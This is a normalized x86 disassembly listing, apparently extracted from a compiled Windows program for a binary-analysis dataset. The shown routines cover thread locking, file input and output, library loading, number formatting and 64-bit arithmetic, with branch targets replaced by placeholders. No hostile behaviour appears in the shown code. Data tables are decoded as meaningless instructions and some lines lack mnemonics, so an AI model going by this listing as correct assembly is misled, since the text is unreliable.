pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_448e38
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_448ef8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
push eax
call CloseHandle
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call DeleteCriticalSection
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_448e8c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44dbdc
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
setge [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0xc ]
cmp [ eax + edx * 8 ] 0x0
je r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ eax + edx * 8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x2c ]
je r-xdata
sub_448ef8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call EnterCriticalSection
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x20 ]
pop ecx
pop ebp
retn
call GetCurrentThreadId
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x4 ]
call sub_448e8c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x1
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
push eax
call WaitForSingleObject
sub_448f68
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
dec [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call LeaveCriticalSection
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x0
sub_448fa8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
call sub_44c070
pop ecx
pop ecx
pop ebp
retn
sub_448fcc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_449045
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_449027
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_44cf24
push eax
call LoadLibraryA
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44902e
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_449054
sbb eax 0xfc000000
cmc
inc esi
add [ eax - 0xbffb8cd ] ch
cmc
inc esi
add [ ebx + esi - 0xa13ffb9 ] ch
inc esi
add [ ebx + esi - 0xa1bffb9 ] dl
inc esi
add [ eax + 0x33 ] bh
inc edi
add ah bl
cmc
inc esi
add [ eax - 0x2bffb8cd ] dh
cmc
inc esi
add [ ebx + esi - 0xa33ffb9 ] dh
inc esi
add [ eax - 0x3bffb8cd ] bh
cmc
inc esi
add [ ebx + esi - 0xa43ffb9 ] bh
inc esi
add al al
xor eax [ edi ]
mov ah 0xf5
inc esi
add ah al
xor eax [ edi ]
lodsb [ esi ]
cmc
inc esi
add al cl
xor eax [ edi ]
movsb [ edi ] [ esi ]
cmc
inc esi
add ah cl
xor eax [ edi ]
pushfd
cmc
inc esi
add al dl
xor eax [ edi ]
xchg esp eax
cmc
inc esi
add [ eax - 0x73ffb8cd ] dl
cmc
inc esi
add ah dl
xor eax [ edi ]
test ch dh
inc esi
add al bl
xor eax [ edi ]
jl r-xdata
add [ ebp + esi * 8 + 0x33d80046 ] al
inc edi
add ah bl
xor eax [ edi ]
je r-xdata
inc esi
add [ ebp + esi * 8 + 0x46 ] bh
inc esi
add al ah
xor eax [ edi ]
insb
cmc
inc esi
add ah ah
xor eax [ edi ]
cmc
inc esi
add [ ebx + esi + 0x47 ] dl
add [ ebp + esi * 8 + 0x46 ] bl
add al ch
xor eax [ edi ]
push esp
cmc
inc esi
add ah ch
xor eax [ edi ]
dec esp
cmc
inc esi
add al dh
xor eax [ edi ]
inc esp
cmc
inc esi
add ah dh
xor eax [ edi ]
cmp al 0xf5
inc esi
add al bh
xor eax [ edi ]
xor al 0xf5
inc esi
add ah bh
xor eax [ edi ]
sub al 0xf5
inc esi
add [ eax ] al
xor al 0x47
add [ esi * 8 + 0x34040046 ] ah
inc edi
add [ esi * 8 + 0x34080046 ] bl
inc edi
add [ eax ] ch
add [ eax ] al
add [ esi * 8 + 0x340c0046 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmc
inc esi
add [ eax ] dl
xor al 0x47
add [ eax ] al
add [ eax ] al
add [ esi * 8 + 0x34140046 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] cl
cmc
inc esi
add [ eax ] bl
xor al 0x47
add [ eax ] al
add [ eax ] al
add [ esi * 8 + 0x341c0046 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmc
inc esi
add [ eax ] ah
xor al 0x47
add [ eax ] al
add [ eax ] al
add ah bh
hlt
sub_449464
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4494cc
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4494d3
retn
mov eax sub_449054
call sub_44c8e8
mov eax r-xdata
call sub_44c904
cmp [ rw-data ] 0x0
je r-xdata
call sub_448240
call sub_448884
call sub_44837c
call sub_448d58
mov eax rw-data
mov edx r-xdata
call sub_44cb34
sub_4495df
push ecx
mov edx [ eax + 0xc ]
test edx edx
jle r-xdata
xor eax eax
xor ecx ecx
mov [ eax + 0xc ] ecx
push ecx
lea ecx [ esp + 0x4 ]
push ecx
push edx
push [ eax + 0x14 ]
push [ eax ]
call WriteFile
test eax eax
je r-xdata
call GetLastError
jmp r-xdata
pop ecx
retn
sub_449624
push esi
mov esi eax
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax [ esi + 0x4 ]
sub eax 0xd7b1
je r-xdata
mov eax 0x80000000
mov edx 0x1
mov ecx 0x3
mov [ esi + 0x1c ] r-xdata
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_44960c
mov [ esi + 0x20 ] sub_4495dc
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov eax 0x40000000
mov edx 0x1
mov ecx 0x2
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_4495dc
cmp [ esi + 0x4 ] 0xd7b2
je r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ esi + 0x48 ]
push eax
call CreateFileA
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x1c ] sub_4495df
mov eax 0xc0000000
mov edx 0x1
mov ecx 0x3
jmp r-xdata
push 0xfffffff5
push 0xfffffff6
jmp r-xdata
mov [ esi + 0x4 ] 0xd7b0
call GetLastError
jmp r-xdata
mov [ esi ] eax
cmp [ esi + 0x4 ] 0xd7b3
jne r-xdata
pop esi
retn
mov [ esi ] eax
call GetStdHandle
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x4 ] 0xd7b1
je r-xdata
dec [ esi + 0x4 ]
push 0x0
push [ esi ]
call GetFileSize
inc eax
je r-xdata
xor eax eax
push [ esi ]
call GetFileType
test eax eax
je r-xdata
sub eax 0x81
jae r-xdata
push [ esi ]
call CloseHandle
mov [ esi + 0x4 ] 0xd7b0
mov eax 0x69
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push eax
push [ esi ]
call SetFilePointer
inc eax
je r-xdata
xor eax eax
mov [ esi + 0x20 ] sub_4495df
push 0x0
mov edx esp
push 0x0
push edx
push 0x80
lea edx [ esi + 0x14c ]
push edx
push [ esi ]
call ReadFile
pop edx
dec eax
jne r-xdata
xor eax eax
cmp [ esi + eax + 0x14c ] 0x1a
je r-xdata
push 0x2
push 0x0
sub eax edx
push eax
push [ esi ]
call SetFilePointer
inc eax
je r-xdata
inc eax
jmp r-xdata
push [ esi ]
call SetEndOfFile
dec eax
jne r-xdata
cmp eax edx
jae r-xdata
jmp r-xdata
sub_4497b2
lea ecx [ eax + 0x14c ]
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] 0xd7b0
mov [ eax + 0x8 ] 0x80
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] sub_449624
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
lea eax [ eax + 0x48 ]
test edx edx
je r-xdata
mov [ eax ] ch
mov ch 0x82
retn
mov cl [ edx ]
inc edx
mov [ eax ] cl
inc eax
test cl cl
je r-xdata
dec ch
jne r-xdata
mov cl [ edx ]
inc edx
mov [ eax ] cl
inc eax
test cl cl
je r-xdata
dec eax
sub_449887
aas
cmp [ rw-data ] 0x0
jle r-xdata
je r-xdata
fdivp st1
retn
mov [ rw-data ] 0x1
push eax
sub esp 0xc
fstp [ esp ]
fld [ r-xdata ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
fsubr [ r-xdata ]
fcomp [ r-xdata ]
fwait
fnstsw ax
shr eax 0x7
and eax 0x2
dec eax
mov [ rw-data ] al
fld [ esp ]
add esp 0xc
pop eax
jmp r-xdata
push eax
sub esp 0x18
fstp [ esp + 0xc ]
fstp [ esp ]
fld [ esp ]
fld [ esp + 0xc ]
mov eax [ esp + 0xc ]
or eax [ esp + 0x10 ]
je r-xdata
xor eax 0xe000000
test eax 0xe000000
je r-xdata
fdivp st1
add esp 0x18
pop eax
retn
mov eax [ esp + 0x14 ]
and eax 0x7fff
jne r-xdata
shr eax 0x1c
cmp [ eax + r-xdata ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
and eax 0x7fff
je r-xdata
mov eax [ esp + 0x14 ]
and eax 0x7fff
je r-xdata
mov eax [ esp + 0x4 ]
add eax eax
jb r-xdata
cmp eax 0x7fff
je r-xdata
cmp eax 0x7fff
je r-xdata
fxch st1
fstp st0
fld st0
fmul [ r-xdata ]
fstp [ esp + 0xc ]
fld [ esp ]
fxch st1
jmp r-xdata
mov eax [ esp + 0x4 ]
add eax eax
jae r-xdata
mov eax [ esp + 0x8 ]
and eax 0x7fff
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x10 ]
add eax eax
jae r-xdata
jmp r-xdata
fmul [ r-xdata ]
fxch st1
fmul [ r-xdata ]
fxch st1
jmp r-xdata
fmul [ r-xdata ]
fxch st1
fmul [ r-xdata ]
fxch st1
jmp r-xdata
sub_4498cc
fxch st1
je r-xdata
fdivp st1
retn
mov [ rw-data ] 0x1
push eax
sub esp 0xc
fstp [ esp ]
fld [ r-xdata ]
fdiv [ r-xdata ]
fmul [ r-xdata ]
fsubr [ r-xdata ]
fcomp [ r-xdata ]
fwait
fnstsw ax
shr eax 0x7
and eax 0x2
dec eax
mov [ rw-data ] al
fld [ esp ]
add esp 0xc
pop eax
jmp r-xdata
push eax
sub esp 0x18
fstp [ esp + 0xc ]
fstp [ esp ]
fld [ esp ]
fld [ esp + 0xc ]
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ esp + 0xc ]
or eax [ esp + 0x10 ]
je r-xdata
xor eax 0xe000000
test eax 0xe000000
je r-xdata
fdivp st1
add esp 0x18
pop eax
retn
mov eax [ esp + 0x14 ]
and eax 0x7fff
jne r-xdata
shr eax 0x1c
cmp [ eax + r-xdata ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
and eax 0x7fff
je r-xdata
mov eax [ esp + 0x14 ]
and eax 0x7fff
je r-xdata
mov eax [ esp + 0x4 ]
add eax eax
jb r-xdata
cmp eax 0x7fff
je r-xdata
cmp eax 0x7fff
je r-xdata
fxch st1
fstp st0
fld st0
fmul [ r-xdata ]
fstp [ esp + 0xc ]
fld [ esp ]
fxch st1
jmp r-xdata
mov eax [ esp + 0x4 ]
add eax eax
jae r-xdata
mov eax [ esp + 0x8 ]
and eax 0x7fff
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x10 ]
add eax eax
jae r-xdata
jmp r-xdata
fmul [ r-xdata ]
fxch st1
fmul [ r-xdata ]
fxch st1
jmp r-xdata
fmul [ r-xdata ]
fxch st1
fmul [ r-xdata ]
fxch st1
jmp r-xdata
sub_4499cb
push ebx
push esi
push edi
push ecx
mov ebx eax
mov esi ecx
mov edi edx
cmp [ ebx + 0x4 ] 0xd7b1
jne r-xdata
cmp eax rw-data
je r-xdata
test esi esi
jle r-xdata
call j_sub_449a4c#3
cmp [ ebx + 0x4 ] 0xd7b1
je r-xdata
mov eax 0x68
call sub_44bbb4
jmp r-xdata
pop ecx
sub ecx esi
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx edx
add edx [ ebx + 0x14 ]
jmp r-xdata
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_44e4dc
mov edx [ ebx + 0xc ]
mov ecx [ ebx + 0x10 ]
sub ecx edx
add edx [ ebx + 0x14 ]
jmp r-xdata
mov al [ edx ]
inc edx
cmp al 0x1a
je r-xdata
cmp al 0xd
je r-xdata
dec edx
stosb [ edi ]
dec esi
jg r-xdata
dec ecx
jl r-xdata
jmp r-xdata
sub edx [ ebx + 0x14 ]
mov [ ebx + 0xc ] edx
sub_449a4c
push ebx
push esi
mov esi eax
mov ebx edx
mov edx [ esi + 0x4 ]
sub edx 0xd7b0
je r-xdata
mov eax esi
mov [ esi + 0x4 ] ebx
call [ esi + 0x18 ]
test eax eax
je r-xdata
cmp edx 0x3
ja r-xdata
pop esi
pop ebx
retn
call sub_44bbb4
mov eax 0x66
call sub_44bbb4
jmp r-xdata
call sub_44e4a0
sub_449a9c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ ebx + 0x4 ]
sub edx 0xd7b0
je r-xdata
mov [ ebx + 0x4 ] 0xd7b3
mov [ ebx + 0x8 ] esi
mov [ ebx + 0x24 ] sub_449bbe
mov [ ebx + 0x1c ] sub_449b47
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp edx 0x3
ja r-xdata
mov [ ebx + 0x24 ] sub_449b47
cmp edi 0x3
je r-xdata
mov eax 0xc0000000
mov dl [ rw-data ]
and edx 0x70
shr edx 0x2
mov edx [ edx + sub_449b7d ]
mov ecx 0x2
sub edi 0x3
je r-xdata
mov eax 0x66
jmp r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
push 0xfffffff5
push 0xfffffff6
jmp r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ ebx + 0x48 ]
push eax
call CreateFileA
mov ecx 0x3
inc edi
je r-xdata
call sub_44bbb4
jmp r-xdata
call sub_44bbb4
cmp eax 0xffffffff
je r-xdata
call GetStdHandle
jmp r-xdata
mov [ ebx + 0x4 ] 0xd7b0
call GetLastError
mov [ ebx ] eax
mov eax 0x40000000
inc edi
mov [ ebx + 0x4 ] 0xd7b2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x80000000
mov [ ebx + 0x4 ] 0xd7b1
sub_449b7d
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ecx ecx
mov cl [ rw-data ]
and cl 0x3
cmp cl 0x2
jbe r-xdata
jmp sub_449a9c
mov cl 0x2
sub_449bd4
push esi
push edi
mov esi edx
cmp [ eax + 0x4 ] 0xd7b2
jne r-xdata
cmp eax rw-data
jne r-xdata
mov edi [ eax + 0x14 ]
add edi [ eax + 0xc ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx ecx
jg r-xdata
mov eax 0x69
call sub_44bbb4
jmp r-xdata
push ecx
push edx
push eax
call j_sub_449a4c#2
pop eax
pop edx
pop ecx
cmp [ eax + 0x4 ] 0xd7b2
je r-xdata
add [ eax + 0xc ] ecx
[ edi ] [ esi ]
add [ eax + 0xc ] edx
sub ecx edx
push eax
push ecx
mov ecx edx
[ edi ] [ esi ]
call [ eax + 0x1c ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_44bbb4
pop ecx
pop eax
jmp r-xdata
pop ecx
pop eax
jmp r-xdata
sub_449c3f
mov ecx edx
test ecx ecx
jg sub_449bd4
sub ecx 0x40
push eax
push ecx
mov ecx 0x40
call sub_449bd4
call sub_401140
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
pop ecx
pop eax
retn
pop ecx
pop eax
jmp r-xdata
mov edx rw-data
cmp ecx 0x40
jle r-xdata
sub_449c82
push ebx
xor ebx ebx
mov bl [ edx ]
sub ecx ebx
jle r-xdata
mov ecx ebx
pop ebx
inc edx
jmp sub_449bd4
push eax
push edx
mov edx ecx
call sub_449c3f
pop edx
pop eax
sub_449cb3
cmp [ eax + 0x4 ] 0xd7b2
jne r-xdata
cmp eax rw-data
jne r-xdata
mov ecx [ eax + 0xc ]
cmp ecx [ eax + 0x8 ]
jge r-xdata
mov eax 0x69
jmp sub_44bbb4
push edx
push eax
call j_sub_449a4c#2
pop eax
pop edx
cmp [ eax + 0x4 ] 0xd7b2
je r-xdata
push eax
push edx
call [ eax + 0x1c ]
test eax eax
jne r-xdata
add ecx [ eax + 0x14 ]
mov [ ecx ] dl
inc [ eax + 0xc ]
retn
call sub_44bbb4
pop edx
pop eax
retn
pop edx
pop eax
jmp r-xdata
sub_449d20
push esi
push edi
mov esi eax
push ecx
mov edi edx
or ecx 0xffffffff
mov al 0x0
[ edi ]
not ecx
dec ecx
mov edi edx
pop edx
sub edx ecx
mov eax esi
push ecx
call sub_449c3f
pop ecx
mov eax esi
mov edx edi
pop edi
pop esi
jmp sub_449bd4
sub_449d7f
fld [ esp + 0x4 ]
push ebx
push esi
push edi
mov ebx eax
mov esi edx
push ecx
sub esp 0x100
cmp ebx 0xff
jle r-xdata
fld st0
fstp [ esp ]
xor eax eax
mov ax [ esp + 0x8 ]
mov edi eax
shr edi 0xf
and ax 0x7fff
cmp ax 0x7fff
je r-xdata
mov ebx 0xff
fstp st0
cmp [ esp + 0x4 ] 0x80000000
mov esi r-xdata
jne r-xdata
fabs
test esi esi
jge r-xdata
mov edi ecx
mov ecx ebx
mov [ edi ] cl
inc edi
sub cl [ esi ]
jbe r-xdata
dec edi
mov esi r-xdata
jne r-xdata
cmp esi 0xd8
jle r-xdata
call sub_449faa
sub [ edi - 0x1 ] cl
mov cl [ esi ]
inc esi
[ edi ] [ esi ]
jmp r-xdata
mov al 0x20
[ edi ]
mov esi r-xdata
fcom [ r-xdata ]
fwait
fnstsw ax
sahf
mov eax 0x0
jb r-xdata
mov esi 0xd8
cmp esi 0x12
jle r-xdata
mov esi 0x2
jmp r-xdata
add esp 0x100
pop ecx
pop edi
pop esi
pop ebx
retn 0xc
inc eax
mov edx esp
push eax
add eax esi
call sub_449f40
pop eax
mov edx esi
mov esi esp
cmp [ esi ] 0x30
je r-xdata
call sub_449faa
cmp eax 0x23
jg r-xdata
mov edx esp
push eax
mov eax esi
call sub_449f40
mov edx edi
mov edi [ esp + 0x104 ]
mov [ edi ] bl
inc edi
mov al 0x20
mov ecx ebx
sub ecx esi
sub ecx 0x8
jle r-xdata
mov esi 0x12
inc esi
mov ecx eax
add ecx edi
test edx edx
je r-xdata
inc eax
dec esi
mov esi ebx
sub esi 0x8
cmp esi 0x2
jge r-xdata
sub [ edi - 0x1 ] cl
test dl dl
je r-xdata
[ edi ]
push eax
push edi
mov edi [ esp + 0x108 ]
mov [ edi ] bl
inc edi
sub ebx ecx
mov ecx ebx
jle r-xdata
inc ecx
add ecx edx
cmp ebx ecx
jg r-xdata
stosb [ edi ]
pop eax
mov ecx esi
mov esi esp
cmp [ esi ] 0x30
je r-xdata
mov al 0x2d
sub [ edi - 0x1 ] cl
pop eax
pop ecx
test eax eax
je r-xdata
mov al 0x20
[ edi ]
mov ebx ecx
inc esi
movsb [ edi ] [ esi ]
mov [ edi ] 0x2e
inc edi
dec ecx
[ edi ] [ esi ]
mov [ edi ] 0x45
mov cl 0x2b
test eax eax
jge r-xdata
inc eax
dec esi
[ edi ] [ esi ]
test edx edx
je r-xdata
mov [ edi ] 0x2d
inc edi
mov [ edi + 0x1 ] cl
xor edx edx
mov cx 0xa
div cx
add dl 0x30
mov [ edi + 0x5 ] dl
xor edx edx
div cx
add dl 0x30
mov [ edi + 0x4 ] dl
xor edx edx
div cx
add dl 0x30
mov [ edi + 0x3 ] dl
add al 0x30
mov [ edi + 0x2 ] al
jmp r-xdata
mov cl 0x2d
neg eax
mov [ edi ] 0x2e
inc edi
mov ecx edx
[ edi ] [ esi ]
sub_449f40
push edi
mov edi edx
mov ecx eax
sub esp 0xa
mov [ edi ] 0x30
fmul [ r-xdata ]
frndint
fcom [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
fbstp [ esp ]
mov edx 0x8
inc edi
fsub [ r-xdata ]
mov [ edi ] 0x31
fwait
mov al [ esp + edx ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jns r-xdata
sub ecx 0x12
jl r-xdata
add edi ecx
cmp [ edi ] 0x35
jl r-xdata
mov al 0x30
[ edi ]
jmp r-xdata
add esp 0xa
pop edi
retn
dec edi
inc [ edi ]
cmp [ edi ] 0x39
jle r-xdata
mov [ edi ] 0x30
jmp r-xdata
sub_449faa
push ebx
sub esp 0xc
xor ebx ebx
cmp [ esp + 0x4 ] 0x0
jne r-xdata
sub ax 0x3fff
mov dx 0x4d10
imul dx
movsx eax dx
neg eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
add esp 0xc
mov eax ebx
pop ebx
retn
sub ebx eax
call sub_449ff0
jmp r-xdata
jmp r-xdata
fld st0
fstp [ esp ]
mov ax [ esp + 0x8 ]
test ax ax
je r-xdata
sub_449ff0
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fldz
retn
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ edx * 2 + sub_44a094 ]
fdivp st1
shr eax 0x5
je r-xdata
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fld [ r-xdata ]
retn
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ edx * 2 + sub_44a094 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ eax * 2 + r-xdata ]
fdivp st1
retn
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ eax * 2 + r-xdata ]
fmulp st1
sub_44a094
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_44a2c4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_44a2e7
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_44a30a
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
xor edi 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_44a382
push esi
mov esi [ esp + 0xc ]
and esi [ esp + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
pop esi
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_44a30a
and eax eax
retn 0x8
mov esi eax
or esi edx
cmp esi 0x80000000
jne r-xdata
mov eax esi
pop esi
dec eax
retn
sub_44a3b4
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
sub_44a3fd
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_44a477
push esi
mov esi [ esp + 0xc ]
and esi [ esp + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
pop esi
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_44a3fd
and eax eax
retn 0x8
mov esi eax
or esi edx
cmp esi 0x80000000
jne r-xdata
mov eax esi
pop esi
dec eax
retn
sub_44a4a9
push ebp
push ebx
push esi
push edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
mov ebp ecx
mov ecx 0x40
xor edi edi
xor esi esi
or edx edx
je r-xdata
loop r-xdata
ja r-xdata
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
